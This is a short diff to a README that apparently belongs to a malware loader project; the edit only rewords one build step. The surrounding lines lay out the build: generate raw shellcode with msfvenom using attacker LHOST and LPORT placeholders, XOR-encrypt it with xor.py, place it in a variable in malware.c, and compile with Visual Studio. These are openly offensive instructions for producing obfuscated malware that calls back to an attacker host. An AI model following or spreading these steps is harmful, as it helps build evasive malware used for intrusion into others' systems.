@@ -11,6 +11,6 @@ msfvenom -p <payload_type> LHOST=<lhost> LPORT=<lport> -f raw -o shellcode.bin
 xor.py shellcode.bin
 ```
 
-* Add the Encrpted shellcode with the variable c inside the malware.c 
+* Add the Encrpted shellcode to variable c in the malware.c file
 
 * Compile the code using Visual Studio IDE
